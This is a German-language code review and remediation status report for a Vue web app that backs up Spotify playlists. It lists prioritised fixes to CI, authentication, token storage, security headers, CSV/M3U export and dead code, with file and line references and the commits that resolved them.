# Backspin: Konsolidierte Code-Analyse

**Stand:** September 2026, Commit `30ee887` (`main`)

**Methode:** Statische Analyse aller 19 Dateien unter `src/` sowie sämtlicher Root-Konfigurationen und Dokumente, ergänzt um die lokale Ausführung von `type-check`, `lint`, `build` und `npm audit`. Der CI-Status wurde über die GitHub-API erhoben; alle Befunde sind mit Datei:Zeile belegt, unsichere Aussagen sind als solche gekennzeichnet.

---

## Umsetzungsstand (September 2026)

Die Maßnahmen 1 bis 28 wurden in sechs Commits (Pakete A bis F) auf dem Feature-Branch umgesetzt:

| Paket | Commit | Inhalt |
|---|---|---|
| A | `53d628b` | Hygiene und CI: type-check grün, ungenutzte Pakete raus, `lint`/`lint:fix` getrennt, `.nvmrc`, `.editorconfig`, Dependabot, Workflow gehärtet |
| B | `2d33b43` | UX und Auth: `ToastContainer`, `ThemeToggle` eingehängt, Auth-Guard, `state`-Parameter, Refresh statt Logout, Setup-Validierung, toter Code raus |
| C | `75ad01a` | Service-Layer `src/services/` (`spotify`, `export`, `download`, `backup-format`), CSV- und M3U-Fixes, Playlist-Auswahl wirkt |
| E | `cde146c` | Security-Header und Meta-CSP, Inter selbst gehostet, Import-Validierung, Tokens aus dem `localStorage` |
| F | `ee45c1c` | Echter Import nach Spotify (`stores/import.ts`), Schreib-Scopes, Alben und gefolgte Künstler |
| D | `569e53f` | Vitest mit 306 Tests in sieben Dateien, PKCE-Extraktion, Test-Step in der CI |
| G | offen (dieser Branch) | Gebündeltes Toolchain-Upgrade: TypeScript 5.9, vue-tsc 3, Vite 7, `@vitejs/plugin-vue` 6, Vitest 5, happy-dom 20, ESLint 10 mit Flat Config und `flat/recommended`, Dependabot-Gruppen (Stufen U2 bis U5) |

Zahlenstand: 29 Maßnahmen erledigt, 0 teilweise, 1 offen (Nr. 2).

Verifiziert nach der Umsetzung: `npm run type-check`, `npm run lint` (mit `--max-warnings 0`), `npm test` (306 Tests) und `npm run build` laufen lokal fehlerfrei. `npm audit` meldet sowohl im vollen Baum als auch mit `--omit=dev` null Findings, seit die Deploy-Werkzeugkette des Originals entfallen ist (siehe Maßnahme 29).

Die Detailkapitel weiter unten beschreiben unverändert den Ausgangszustand vom Commit `30ee887`. Jedem Kapitel ist ein Satz „Stand nach Umsetzung" vorangestellt, der den heutigen Stand einordnet.

---

## Zusammenfassung

*Stand nach Umsetzung: Alle fünf Punkte sind behoben. Toasts werden gerendert, Import und Playlist-Auswahl sind echt, `type-check`, `lint`, `test` und `build` laufen fehlerfrei, die Security-Header stehen, und der CSV-Export ist repariert.*

1. **Die App gibt dem Nutzer keinerlei Rückmeldung.** Der Toast-Store füllt ein Array, das keine einzige Komponente rendert; 21 Erfolgs- und Fehlermeldungen bleiben unsichtbar (`stores/app.ts:14`).
2. **Zwei zentrale Features sind Attrappen:** Der Import ist eine `setTimeout`-Simulation ohne Spotify-Aufruf (`ImportView.vue:291-317`), und die Playlist-Auswahl der Vorschau wird beim Export ignoriert (`BackupPreviewView.vue:413-428`).
3. **Es gibt faktisch keine Qualitätssicherung.** `type-check` ist rot (3 Fehler), `lint` läuft in der CI mit `--fix` und ohne `--max-warnings`, es existiert kein einziger Test, und laut GitHub-API hat der Workflow nie ausgeführt.
4. **Sicherheit:** Langlebige Tokens im `localStorage` treffen auf vollständig fehlende Security-Header (`firebase.json:15-34`), obwohl die README eine CSP behauptet.
5. **Der CSV-Export ist nachweislich defekt:** Jede Zeile enthält „Invalid Date", und ein Anführungszeichen im Playlistnamen zerlegt die Datei (`stores/backup.ts:289`).

---

## Priorisierte Maßnahmenliste

Sortiert nach Nutzen pro Aufwand. Aufwand: S = unter 1 h, M = 1 bis 4 h, L = über 4 h.

| Nr. | Maßnahme | Bereich | Aufwand | Nutzen | Beleg | Status |
|---|---|---|---|---|---|---|
| 1 | Drei ungenutzte Variablen entfernen, damit `vue-tsc` wieder durchläuft | CI | S | hoch | `components/BuyMeACoffee.vue:35`, `stores/theme.ts:2`, `views/CallbackView.vue:51` | erledigt (`53d628b`) |
| 2 | GitHub Actions im Repository aktivieren, damit `ci.yml` überhaupt läuft | CI | S | hoch | `.github/workflows/ci.yml:1-29`, GitHub-API: 0 Workflows, 0 Runs | **offen** – Repository-Einstellung, die nur der Owner in GitHub aktivieren kann; von hier aus weder prüf- noch änderbar |
| 3 | `ToastContainer.vue` schreiben und in `App.vue` einhängen | Architektur | S | hoch | `stores/app.ts:14,58-76`, `App.vue` (kein Toast im Template) | erledigt (`2d33b43`) – gerendert in `App.vue` |
| 4 | Header-Block für `source: "**"` in `firebase.json` ergänzen (CSP, `nosniff`, `frame-ancestors`, `Referrer-Policy`) | Sicherheit | S | hoch | `firebase.json:15-34` | erledigt (`cde146c`) – zusätzlich als `<meta http-equiv>` in `index.html` |
| 5 | `axios crypto-js jszip file-saver @vueuse/core @types/crypto-js @types/file-saver` deinstallieren, vorher `tsconfig.json:22` und `src/types/file-saver.d.ts` bereinigen | Dependencies | S | hoch | `package.json:17-21,29-30`, `tsconfig.json:22` | erledigt (`53d628b`) – `jszip` blieb bewusst und wird jetzt in `services/export.ts` genutzt |
| 6 | CSV-Export reparieren: `added_at` durchreichen und Felder nach RFC 4180 quoten | Export | S | hoch | `stores/backup.ts:121-124`, `:289` | erledigt (`75ad01a`) – `escapeCsvValue`, `added_at` kommt aus `SpotifyPlaylistItem` |
| 7 | `lint` und `lint:fix` trennen, die CI ruft `lint --max-warnings 0` | CI | S | hoch | `package.json:11`, `.github/workflows/ci.yml:24` | erledigt (`53d628b`) |
| 8 | In `loadFromStorage` bei abgelaufenem Access-Token refreshen statt `logout()` aufzurufen | Auth | S | hoch | `stores/auth.ts:93-96` | erledigt (`2d33b43`) |
| 9 | `startAuth` in `try/catch` kapseln und die fehlende Client-ID sichtbar melden | Fehlerbehandlung | S | hoch | `composables/useSpotifyAuth.ts:46-48`, `BackupView.vue:50`, `ImportView.vue:30` | erledigt (`2d33b43`) – ohne Client-ID Toast plus Weiterleitung ins Setup |
| 10 | `meta.requiresAuth` plus globalen Guard einführen, `/backup/preview` zusätzlich auf vorhandene Backup-Daten prüfen und sonst auf `/backup` umleiten | Architektur | S | hoch | `main.ts:79-84`, `BackupPreviewView.vue:447-460` | erledigt (`2d33b43`) |
| 11 | Import in UI und Guide als „noch nicht verfügbar" kennzeichnen, bis er echt ist | Doku vs. Code | S | hoch | `ImportView.vue:291-317`, `GuideView.vue:266-270` | erledigt (`ee45c1c`) – gegenstandslos geworden: der Import ist echt, Guide und UI beschreiben ihn korrekt |
| 12 | `npm update` innerhalb der bestehenden Ranges ausführen (behebt die `postcss`-Findings) | Dependencies | S | hoch | `npm outdated`: kein Paket auf `Latest`, neun mit `Wanted == Current` | erledigt (`53d628b`) – `npm outdated` meldet überall `Wanted == Current` |
| 13 | `.github/dependabot.yml` für `npm` und `github-actions` anlegen (erst nach Nr. 1 und 2) | Dependencies | S | hoch | kein `dependabot.yml`/`renovate.json` im Repo | erledigt (`53d628b`) |
| 14 | `state`-Parameter erzeugen, im `sessionStorage` ablegen und im Callback vergleichen | Sicherheit | S | mittel | `useSpotifyAuth.ts:61-67`, `CallbackView.vue:60-87` | erledigt (`2d33b43`) – `generateState`, Abgleich in `handleCallback` |
| 15 | `SetupView.validateClientId` auf `authStore.setClientId()` umstellen und die Prüfung auf `/^[0-9a-f]{32}$/i` verschärfen | Auth | S | mittel | `SetupView.vue:258-282`, `stores/auth.ts:167-171` | erledigt (`2d33b43`) |
| 16 | `logout()` vervollständigen: `backupStore.reset()` und `sessionStorage.removeItem('spotify_code_verifier')`, Letzteres auch im `finally` von `handleCallback` | Sicherheit | S | mittel | `stores/auth.ts:51-61`, `useSpotifyAuth.ts:131,146-149` | erledigt (`2d33b43`) – Verifier und State im `finally`, `backupStore.reset()` im Composable |
| 17 | Inter selbst hosten statt über Google Fonts laden | Sicherheit | S | mittel | `index.html:33-35`, `PRIVACY.md:20-24` | erledigt (`cde146c`) – `@fontsource/inter` |
| 18 | `ThemeToggle.vue` in die Navigation einhängen oder löschen und die README korrigieren | Toter Code | S | mittel | `src/components/ThemeToggle.vue` (0 Importe), `README.md:40` | erledigt (`2d33b43`) – eingehängt in Desktop- und Mobil-Navigation |
| 19 | Zwölf ungenutzte Typen, die Step-Fassade und die Modal-Infrastruktur entfernen | Toter Code | S | mittel | `types/index.ts:117-203`, `stores/app.ts:15,41-56,90-111` | erledigt (`2d33b43`) |
| 20 | `.nvmrc` mit `22` anlegen, `engines` anheben, die CI auf `node-version-file` umstellen | CI | S | mittel | `.github/workflows/ci.yml:14-17`, `package.json:44-46` | erledigt (`53d628b`) |
| 21 | `concurrency`, `permissions: contents: read` und `timeout-minutes` in `ci.yml` ergänzen, `VITE_SPOTIFY_CLIENT_ID` streichen | CI | S | mittel | `.github/workflows/ci.yml:9-12,26-29` | erledigt (`53d628b`) |
| 22 | Autorisierungscode sofort per `history.replaceState` aus der URL entfernen und mit `router.replace` navigieren | Sicherheit | S | niedrig | `CallbackView.vue:63,78-80` | erledigt (`2d33b43`) |
| 23 | Playlist-Auswahl und Filter im Export tatsächlich anwenden oder die Auswahl-UI entfernen | Export | M | hoch | `BackupPreviewView.vue:413-428`, `stores/backup.ts:279` | erledigt (`75ad01a`) – `applyBackupOptions` über `buildExportData` |
| 24 | `src/services/spotify.ts` mit `spotifyFetch()` (401 mit Refresh, 429 mit `Retry-After`, Fehler-Mapping) und `paginate()` anlegen | Architektur | M | hoch | `stores/backup.ts:63-153`, `useSpotifyAuth.ts:88,110`, `stores/auth.ts:111` | erledigt (`75ad01a`) – Token-Austausch und der einmalige Profilabruf im Callback bleiben bewusst außerhalb, dort existiert noch kein Store-Token |
| 25 | Vitest einrichten, `buildCsv`/`buildM3u` und die PKCE-Helfer als reine Funktionen extrahieren, die sieben Kerntests schreiben, Test-Step in die CI | Tests | M | hoch | kein Test-Runner in `package.json:7-15` | erledigt (`569e53f`) – 306 statt sieben Tests |
| 26 | Import-Validierung auf Typen und `metadata` ausweiten, Dateigröße begrenzen | Sicherheit | M | mittel | `ImportView.vue:247-271`, `:315` | erledigt (`cde146c`) – `services/validate-backup.ts`, 50 MB |
| 27 | M3U-Export auf eine ZIP-Datei umstellen und `\r`/`\n` aus Namen entfernen | Export | M | mittel | `stores/backup.ts:311-330` | erledigt (`75ad01a`) – `buildM3uZip`, eindeutige Dateinamen |
| 28 | Access-Token nur im Speicher halten, Refresh-Token in den `sessionStorage` verschieben | Sicherheit | M | mittel | `stores/auth.ts:69-72,77-92,133-137` | erledigt (`cde146c`) |
| 29 | Deploy-Job auf `push: main` mit Firebase-Secret, `firebase-tools` als lokale devDependency entfernen | CI | M | mittel | `.github/workflows/ci.yml` (kein Deploy-Job), `package.json:14,37` | erledigt, aber anders gelöst – der Fork hostet selbst hinter Caddy. Statt eines CI-Deploys gibt es `deploy/deploy.sh` auf dem Host (fetch, `reset --hard`, `npm ci`, Build, `systemctl reload caddy`) und die Caddy-Konfiguration in `deploy/`. Damit entfiel die devDependency samt aller `npm audit`-Findings; `npm audit` meldet jetzt im vollen Baum null. Ein CI-Deploy bleibt bewusst aus: Der Host ist nicht aus GitHub Actions erreichbar |
| 30 | ESLint 9 mit Flat Config, dabei auf `vue3-recommended` und `eslint:recommended` heben | Tooling | M | mittel | `.eslintrc.cjs:4-7` | erledigt (Paket G) – `eslint.config.js` mit ESLint 10, `@eslint/js` recommended, `eslint-plugin-vue` `flat/recommended` und `vueTsConfigs.recommended`; `.eslintrc.cjs` gelöscht. Zwei reine Umbruchregeln sind mit Begründung deaktiviert |

### Begründung der Reihenfolge der ersten fünf

**Nr. 1 zuerst,** weil `type-check` der dritte von fünf CI-Schritten ist: Solange er rot ist, werden Lint und Build in einem Lauf nie erreicht. Drei gelöschte Zeilen entsperren jede weitere CI-Maßnahme.

**Nr. 2 direkt danach,** weil alle Qualitätszusagen aus `CONTRIBUTING.md` unerzwungen bleiben, solange kein Workflow läuft. Nr. 1 ohne Nr. 2 wäre ein Fix ohne Wächter, Nr. 2 ohne Nr. 1 eine dauerhaft rote CI.

**Nr. 3 als größter sichtbarer Nutzen pro Zeile:** Eine einzelne Komponente macht 21 bereits geschriebene Meldungen sichtbar. Ohne sie bleibt jeder weitere Fehlerbehandlungs-Fix für den Nutzer folgenlos, weil das Ergebnis nirgends ankommt.

**Nr. 4,** weil ein Header-Block in `firebase.json` in wenigen Minuten geschrieben ist und gleichzeitig das Token-Risiko im `localStorage`, Clickjacking und die unkontrollierte `connect-src` entschärft. Er ist außerdem die Voraussetzung dafür, dass die Aussage in `README.md:135` nicht länger falsch ist.

**Nr. 5,** weil ein einziger `npm uninstall` vier von fünf Produktiv-Findings aus `npm audit` beseitigt, ohne eine Zeile Anwendungscode zu berühren, und weil `axios` in `package.json` direkt der Vorgabe aus `CLAUDE.md` widerspricht, HTTP über natives `fetch` abzuwickeln.

---

## Zusätzliche Erkenntnisse aus der Umsetzung

Punkte, die in der ursprünglichen Analyse nicht enthalten waren und erst beim Umbau auffielen.

**Der Spotify-API-Umbau vom Februar 2026 betrifft fast jeden Endpunkt der App.** Recherchiert und im Code berücksichtigt:

- `POST /v1/users/{id}/playlists` ist entfernt; Playlists werden über `POST /v1/me/playlists` angelegt.
- `PUT /v1/me/tracks` und `PUT /v1/me/albums` sind zugunsten von `PUT /v1/me/library?uris=` abgelöst (maximal 40 URIs je Anfrage), der Abgleich läuft über `GET /v1/me/library/contains?uris=`.
- Feldumbenennungen: Ein Eintrag in `GET /v1/playlists/{id}/items` heißt jetzt `item` statt `track`, die Playlist-Größe steht in `items.total` statt `tracks.total`. Beide Altnamen werden in `services/spotify.ts` weiterhin als Fallback gelesen, damit die App mit beiden Antwortformen umgehen kann.
- `GET /v1/me` liefert `email`, `country`, `product` und `followers` nicht mehr; im Typ `SpotifyUser` sind alle Felder außer `id`, `display_name` und `images` optional. Die früher exportierte E-Mail-Adresse steht damit auch nicht mehr im Backup.
- *Unsicher, aus der Recherche übernommen:* Refresh-Tokens laufen seither nach etwa sechs Monaten ab. Praktisch spielt das kaum eine Rolle, weil der Refresh-Token seit Maßnahme 28 ohnehin nur im `sessionStorage` liegt und mit dem Tab verschwindet.

**Der Light-Mode war nur nominell vorhanden, ist inzwischen aber umgesetzt.** Befund der Analyse: `ThemeToggle` war eingehängt und setzte die Klasse `dark` korrekt, aber `tailwind.config.js` definierte `background`, `surface`, `text` und `text-secondary` als feste dunkle Werte, und `src/style.css` enthielt Overrides ausschließlich für `.dark`; optisch änderte das Umschalten daher fast nichts. Maßnahme 18 hatte den Schalter angeschlossen, nicht die Palette repariert. Behoben mit dem Token-Umbau, siehe „Nächste Schritte" Punkt 2.

**`@vue/test-utils` und `@pinia/testing` sind installiert, werden aber nicht genutzt.** Die 306 Tests decken Services und die Stores `auth` und `import` ab; Komponenten- und View-Tests gibt es keine. Entweder kommen sie noch, oder die beiden Pakete gehören wieder heraus.

**Ein zusätzlicher Bug wurde gefunden und behoben:** `isTokenExpired` war ein `computed` über `Date.now()`. Da `Date.now()` nicht reaktiv ist, hat Vue den ersten berechneten Wert dauerhaft gecacht, und die Prüfung hätte einen Ablauf nie gemeldet. Der Ablauf fiel erst durch den Test der drei Grenzfälle auf; die Funktion ist jetzt eine gewöhnliche Funktion (`stores/auth.ts`, Commit `569e53f`).

**Der Speicherort der Keys ist jetzt dreigeteilt** (Arbeitsspeicher, `sessionStorage`, `localStorage`) und in `STORAGE_KEYS` gebündelt. Eine Ausnahme bleibt: `theme-preference` steht weiterhin als Literal in `stores/theme.ts` und nicht in `STORAGE_KEYS`.

---

## Nächste Schritte

Priorisiert. Die ersten drei Punkte sind Voraussetzung dafür, den Umbau überhaupt als abgeschlossen zu bezeichnen.

1. **Erster echter Test gegen die Spotify-API mit einem Premium-Account: Backup erstellen, danach Import in eine Test-Playlist.** Bis heute ist der gesamte Umbau nur gegen gemockte Antworten geprüft. Drei Stellen sind im Code ausdrücklich als unsicher markiert und lassen sich nur so klären:
   - **Folgen von Künstlern über `PUT /me/library` oder `PUT /me/following`.** Die Spezifikation vom Februar 2026 führt Artist-URIs für `GET /me/library/contains` auf, für `PUT /me/library` dagegen nicht, während der abgekündigte Endpunkt `PUT /me/following` auf `/me/library` verweist. `services/spotify.ts` versucht deshalb zuerst `/me/library` und fällt bei HTTP 400 auf `PUT /me/following?type=artist&ids=` zurück. Welcher Weg tatsächlich funktioniert, muss ein echter Lauf zeigen.
   - **Wortlaut der 403-Antwort bei fehlenden Scopes.** `stores/import.ts` erkennt fehlende Schreibrechte über `error.status === 403` und einen Test auf `insufficient` oder `scope` in der Fehlermeldung. Weicht Spotify davon ab, greift der Hinweis „bitte neu anmelden" nicht, und der Nutzer sieht stattdessen eine generische Fehlermeldung.
   - **Episoden-URIs in `POST /playlists/{id}/items`.** Das Backup speichert Podcast-Episoden mit, weil `GET /items` sie mit `additional_types=track,episode` liefert. Ob der Schreib-Endpunkt `spotify:episode:`-URIs annimmt, ist ungeprüft.
2. **Erledigt: Light-Mode als vollwertiges zweites Theme.** Alle themeabhängigen Farben stehen jetzt als CSS-Custom-Properties in `src/style.css` (`:root` = Light, `.dark` = Dark) und werden in `tailwind.config.js` über `rgb(var(--color-x) / <alpha-value>)` eingebunden, sodass Opacity-Modifier erhalten bleiben. Die feste Neutral-Rampe `accent-*` und die ungenutzte `secondary`-Rampe sind entfallen und durch semantische Tokens ersetzt (`surface`/`surface-muted`/`surface-raised`, `border`/`border-strong`, `text`/`text-secondary`/`text-muted`, `brand`, `on-primary`, `on-status`, `success`/`error`/`warning`/`info` mit `-surface` und `-border`). Die Markenfarbe bleibt als Füllfarbe in beiden Themes gleich, bekommt auf Flächen aber nahezu schwarzen Text: Weiß darauf bliebe auch im Dark-Mode unter AA (damals Spotify-Grün mit 2,6:1, seit der Umbenennung Bernstein `#E6A62E` mit 1,9:1, siehe Punkt 7). Drei Tests sichern das ab (`src/__tests__/theme-contrast.test.ts` rechnet die WCAG-Kontraste aus den Tokens nach, `theme-tokens.test.ts` verbietet feste Tailwind-Farben in den Templates, `theme-init.test.ts` prüft das Pre-Paint-Skript), dazu Store-Tests in `src/stores/__tests__/theme.test.ts`. `public/theme-init.js` setzt die Theme-Klasse vor dem ersten Paint; es liegt als statische Datei in `public/`, weil die CSP nur `script-src 'self'` erlaubt. Offen bleibt allein, dass `ThemeToggle` die dritte Einstellung `auto` des Stores nicht anbietet.
3. **Erledigt, anders gelöst als geplant (Maßnahme 29): Deploy per Skript auf dem Host statt Deploy-Job in der CI.** Der Fork liefert das gebaute `dist/` selbst hinter Caddy 2 aus. Die Konfiguration liegt in `deploy/` (Snippet mit Security-Headern und Cache-Regeln, zwei Caddyfile-Varianten, Anleitung), das Update übernimmt `deploy/deploy.sh` auf dem Host. Ein Deploy-Job in GitHub Actions bleibt bewusst aus, weil der Host von dort nicht erreichbar ist; der Live-Stand ist damit weiterhin nicht automatisch einem Commit zuzuordnen. Als Nebeneffekt ist `firebase-tools` entfallen, und `npm audit` meldet jetzt auch im vollen Baum null Findings.
4. **Security-Header am Live-System gegenprüfen.** Nach dem nächsten Deploy mit `curl -I` prüfen, ob CSP, `Strict-Transport-Security` und die Cache-Regeln so ankommen wie in `deploy/backspin.caddy` konfiguriert. Gegen einen lokalen Caddy sind sie geprüft, gegen den tatsächlichen Host mit vorgeschaltetem Tunnel noch nicht.
5. **GitHub Actions im Repository aktivieren (Maßnahme 2)** und anschließend eine Branch Protection auf `main` einrichten, die den grünen Workflow verlangt.
6. **Erledigt: `pinia` 2 auf 4, `vue-router` 4 auf 5 und `@pinia/testing` 0.1 auf 2 (Stufe U6).** `vue-router` 5 führt `unplugin-vue-router` in den Kern; die klassische API (`createRouter`, `createWebHistory`, `useRouter`, `useRoute`, `<router-link>`) bleibt unverändert, der Vite-Plugin-Einstieg `vue-router/vite` ist nur für dateibasierte Routen nötig und wird hier nicht verwendet. Angepasst wurde einzig der Guard in `src/main.ts`: vue-router 5 setzt das `next()`-Callback ab, das Guard-Ergebnis wird jetzt zurückgegeben. `vue-router` 5 verlangt als Peer `vue >= 3.5.34`, deshalb steht `vue` jetzt auf `^3.5.34` (weiterhin 3.x). Offen bleibt der eigentliche Zweck von `@pinia/testing`: Es ist installiert, aber unbenutzt (siehe Punkt 8).
7. **Erledigt: Produktname vereinheitlicht, danach auf „Backspin" umbenannt.** `og:url` und `twitter:url` sind entfernt, weil sie auf eine fremde Domain zeigten und die URL beim Selbsthosten nicht feststeht. Der Name war zunächst überall „SpotMyBackup 2" und lautet seit der Umbenennung überall „Backspin": in den sieben Routen-Titeln (`src/main.ts`), im `author`-Meta-Tag und im `<title>` (`index.html`), in `package.json`, in `GuideView.vue` sowie in Navigation und Footer (`App.vue`); der Export-Dateiname beginnt mit `backspin-`. „MySpotBackup" und „SpotMyBackup 2" kommen nur noch in den Herkunftsangaben vor (MIT-Vermerk in `LICENSE`, Danksagungen in `README.md`, Fußzeile in `App.vue`) und in den historischen Befunden dieses Dokuments. Mit der Umbenennung ist auch die Markenfarbe gewechselt: Spotify-Grün war für eine Drittanbieter-App zu nah an Spotifys eigener Marke und steht jetzt nur noch am Anmeldeknopf (`.btn-spotify`); Marke ist ein Bernsteinton (`primary` = `#E6A62E`, `brand` = `122 82 0` hell / `233 169 58` dunkel), der Kontrast-Test deckt beide Fälle ab. Das alte grüne Häkchen als Logo ist durch eine eigene Marke ersetzt, eine Schallplatte mit Rille und Pfeil gegen die Drehrichtung (`public/favicon.svg`). Die Jahreszahl im Footer kommt aus `new Date().getFullYear()` statt aus einer festen „2024".
8. **Komponententests** für `ImportView` und `BackupPreviewView` mit den bereits installierten `@vue/test-utils` und `@pinia/testing`, oder beide Pakete entfernen.
9. **Restliche wiederholte Stellen zusammenfassen:** Nutzer-Karte, Anmelde-Block und die mehrfach kopierten Icon-SVGs in eigene Komponenten (`AuthGate.vue`, `UserCard.vue`, `components/icons/`).
10. **Dependency-Stufen U6 bis U8** abarbeiten (U1 bis U5 sind mit Paket G erledigt). `.stylelintrc.json` ohne installiertes stylelint gehört bei der Gelegenheit gelöscht.

---

## Architektur

*Stand nach Umsetzung: Der Service-Layer `src/services/` existiert, HTTP, Export und Download liegen außerhalb der Stores, es gibt einen Auth-Guard und mit `stores/import.ts` einen eigenen Import-Store. Die Befunde dieses Kapitels beschreiben den Ausgangszustand.*

### Ist-Schichtung

Die App besteht aus `main.ts` (Router inline, ein einziger Guard für `document.title`), `App.vue` als Layout, sieben Views, zwei Komponenten, vier Pinia-Stores, einem Composable und einer Typdatei. Es gibt keinen Service- oder API-Layer, kein `src/utils/`, keine Router-Guards mit Fachlogik und keine zentrale Fehlerbehandlung.

### Befunde

**Spotify-HTTP-Aufrufe liegen im Pinia-Store.** `stores/backup.ts:63-153` enthält vier fast identische Fetch-Funktionen inklusive Header-Bau, Pagination und Fehlerinterpretation. Ein fünfter Profil-Fetch steht in `composables/useSpotifyAuth.ts:110-118`, zwei Token-POSTs in `useSpotifyAuth.ts:88` und `stores/auth.ts:111`.
*Auswirkung:* Retry, Rate-Limit-Behandlung, Token-Refresh bei 401 und Fehler-Mapping müssten an sieben Stellen einzeln nachgezogen werden; der Store ist ohne Netzwerk nicht isolierbar.
*Empfehlung:* Maßnahme 24.

**Der Store greift direkt auf das DOM zu.** `stores/backup.ts:242-262`, `:282-307` und `:309-336` bauen jeweils `document.createElement('a')`, klicken den Link und rufen `URL.revokeObjectURL`. Serialisierung und Browser-I/O sind mit State-Management vermischt, und die drei Exporter driften bereits auseinander: Der JSON-Zweig hält die Objekt-URL in einer eigenen Variablen, die anderen beiden lesen `link.href` zurück.
*Empfehlung:* `src/utils/download.ts` und `src/utils/export.ts`; das ist zugleich die Voraussetzung für Maßnahme 25.

**Die Client-ID-Persistenz umgeht den Store.** `views/SetupView.vue:282` schreibt direkt `localStorage.setItem('spotify_client_id', ...)`, obwohl `stores/auth.ts:167-171` genau dafür `setClientId()` anbietet. Die Aktion wird nirgends aufgerufen.
*Auswirkung:* `authStore.clientId` wird nur bei Store-Erzeugung hydratisiert (`auth.ts:188`). Wer im selben Seitenladevorgang zuerst `/backup` und dann `/setup` besucht, hat einen Store mit leerer `clientId`; `refreshAccessToken()` bricht dann in `auth.ts:105-107` ab und löst über `auth.ts:143` einen stillen Logout aus.
*Einschränkung (unsicher):* Der OAuth-Redirect ist ein vollständiger Seiten-Load, der den Store meist frisch hydratisiert. Das Zeitfenster ist real, aber schmal.

**Es gibt keinen Auth-Guard.** `src/main.ts:79-84` enthält genau einen `beforeEach`, der nur den Titel setzt. `/backup/preview` prüft weder Login noch Datenbestand: Ohne Login ist `user.value` gleich `null`, `filteredPlaylists` (`BackupPreviewView.vue:343-356`) filtert gegen `undefined` und liefert eine leere Liste. Die einzige Rückmeldung wäre ein Toast, der nicht gerendert wird. `/backup` und `/import` lösen den Fall stattdessen per `v-if="!isAuthenticated"` im Template, mit fast identischem Markup (`BackupView.vue:36-60`, `ImportView.vue:16-40`).

**Kein einheitliches Fehlerkonzept.** Vier Stile stehen nebeneinander: `throw new Error(...)` ohne Statusauswertung (`backup.ts:71,91,117,144`), `catch` mit `console.warn` und stillem Weitermachen (`backup.ts:194-198`), `catch` mit `appStore.showError` (unsichtbar, siehe Kapitel „Tote und duplizierte Stellen") und `catch (error) { ... }` mit verworfener Variablen (`backup.ts:259,304,333`, `ImportView.vue:266,320`, `SetupView.vue:289`). `stores/app.ts:9` und `:29` bieten `state.error` und `setError()` an, beides wird nirgends aufgerufen.
*Auswirkung:* Ein 401, 403 oder 429 von Spotify ist für den Nutzer nicht von einem Netzwerkfehler unterscheidbar. Schlimmer: `backup.ts:194-198` schiebt eine Playlist, deren Tracks nicht geladen werden konnten, ohne Tracks ins Backup. Das Ergebnis ist ein stillschweigend unvollständiges Backup, also der gefährlichste Fehlerfall für ein Backup-Werkzeug, weil er erst beim Wiederherstellen auffällt.

**`startAuth` kann unbehandelt rejecten.** `BackupView.vue:50` und `ImportView.vue:30` binden `@click="startAuth"` direkt an den Button. `useSpotifyAuth.ts:46-48` wirft ohne Client-ID. Ohne `try/catch` und ohne Toast-Rendering endet das als Unhandled Rejection in der Konsole; der Button wirkt für den Nutzer schlicht kaputt.

**Der Token-Refresh greift nur innerhalb einer Sitzung.** Der verifizierte Kern steht in `stores/auth.ts:93-96`: Ist der Access-Token beim Laden abgelaufen, ruft `loadFromStorage()` `logout()` auf, statt den vorhandenen und praktisch unbegrenzt gültigen Refresh-Token einzulösen. Der Nutzer muss nach einer Stunde Abwesenheit den vollständigen OAuth-Flow erneut durchlaufen. Ergänzend fehlt ein Sicherheitspuffer bei der Ablaufprüfung: `auth.ts:25-28` vergleicht exakt gegen `Date.now()`, sodass ein Token zwischen Prüfung und Request ablaufen kann; ein Vorlauf von 60 Sekunden wäre eine Einzeiler-Verbesserung. Und `getValidAccessToken()` wird in `backup.ts:161` genau einmal vor dem Backup aufgerufen; bei den in `GuideView.vue:326` selbst genannten 10 bis 15 Minuten Laufzeit kann das Token mitten im Lauf ablaufen.

**Kopplung zwischen den Stores.** `stores/backup.ts:31-32` instanziiert `useAuthStore()` und `useAppStore()` im Setup-Body und meldet Erfolge selbst (`backup.ts:230`), obwohl `views/BackupView.vue:255` direkt danach dieselbe Meldung erzeugt. `stores/auth.ts:164` und `:188` führen Seiteneffekte im Store-Setup aus, wobei `loadFromStorage` einen `logout()` samt `localStorage.removeItem` auslösen kann. Damit wird die Reihenfolge der Store-Erzeugung semantisch relevant.

**Zustandsmodell.** Die Konvention „ein `state`-Ref pro Store" wird überall angelegt und überall durchbrochen: `auth.ts:7-8`, `app.ts:14-15`, `backup.ts:18-29`, und `theme.ts:6-7` hat gar kein `state`-Objekt. Zusätzlich exportieren alle Stores das rohe `state`-Ref (`auth.ts:192`, `app.ts:145`, `backup.ts:340`) neben den Gettern, womit der Kapselungsvorsatz aufgehoben ist: Jede Komponente könnte `store.state.accessToken` direkt überschreiben.

**Import-Logik vollständig in der View.** `views/ImportView.vue:247-325` liest die Datei, validiert, „importiert" und zählt das Ergebnis im Component-Setup. Einen Import-Store gibt es nicht, obwohl `types/index.ts:117-131` mit `ImportState` und `ImportConflict` bereits die passenden Typen definiert; beide sind ungenutzt.

---

## Tote und duplizierte Stellen

*Stand nach Umsetzung: Toasts und `ThemeToggle` sind angeschlossen, das nie befüllte Loading-Overlay sowie Step- und Modal-Fassade samt der ungenutzten Typen sind entfernt, die Playlist-Auswahl wirkt im Export. Offen bleiben das wiederholte Markup und die mehrfach kopierten Icon-SVGs.*

### Nie gerenderte Infrastruktur

**Toasts.** Verifiziert: Außerhalb von `stores/app.ts` und der Typdefinition `types/index.ts:158` gibt es im gesamten Projekt keinen Treffer für `toast`. `app.ts:14` hält das Array, `:58-76` füllt es, `:78-83` räumt es nach fünf Sekunden ab, und kein Template liest es. Betroffen sind 21 Aufrufe von `showSuccess`, `showError` und `showInfo` in `backup.ts` (8), `useSpotifyAuth.ts` (2), `SetupView.vue` (2), `ImportView.vue` (4), `BackupPreviewView.vue` (4) und `BackupView.vue` (1). Das ist zugleich ein Sicherheitsbefund: Fehlgeschlagene Anmeldungen, abgelaufene Sessions und fehlerhafte Importe bleiben stumm, der Nutzer nimmt Erfolg an. Nebenbefund für die spätere Umsetzung: `app.ts:59` bildet die Toast-ID aus `Date.now().toString()`, zwei Toasts in derselben Millisekunde kollidieren.

**Loading-Overlay.** Verifiziert: `setLoading` (`stores/app.ts:25`) wird außerhalb der Store-Datei nirgends aufgerufen. `App.vue:176` rendert ein Overlay an `isLoading` (`App.vue:197`), das damit dauerhaft `false` bleibt.

